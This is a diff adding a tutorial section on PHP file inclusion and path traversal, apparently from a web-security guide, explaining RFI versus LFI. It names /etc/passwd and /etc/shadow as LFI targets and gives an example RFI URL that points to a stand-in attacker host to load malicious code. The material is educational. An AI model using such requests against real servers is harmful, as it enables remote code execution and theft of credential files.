@@ -166,3 +166,13 @@ An example for this is let's say you have a Self-XSS on your account, what you c
 From that, you can create a very nice phishing attack, like <i>We are sorry, could you re-login here</i>...<br><br>
 
 ## File Inclusions/Path Traversals
+
+Next on the list we have RFI/LFI and Path Traversals. File Inclusions are mostly found in PHP Applications, they are the result of using <code>include()</code> function incorrectly. People sometimes can't make the difference between those two similiar vulnerabilities, that's okay because here I'll try to explain it on some easy examples.
+Let's see now:
+The easiest way to explain it:
+When an attacker is exploiting RFI he uses a Remote File while on the other side LFI uses local files when they are attacking server, even the name of the vulnerability tells you that. While exploiting LFI you can get response from the local files on system, for example <code>/etc/passwd</code> or <code>/etc/shadow</code>.
+
+On the other hand while exploiting RFI you can upload file from remote server which in 99% of the times will result in RCE(Remote Code Execution). Nowadays it's very rare to see RFI in the wild because including files from remote location is disabled in PHP by default (<code>allow_url_include</code>).
+For example <code>https://localhost/app.php?file=http://attackers.website.com/somemaliciousfile</code>. You could execute malicious code from the <code>somemaliciousfile</code> file and use it for evil intention.
+
+LFI is way more popular than RFI because nowadays it is way easier to protect against including Remote Malicious Files, but you never know 🙂.
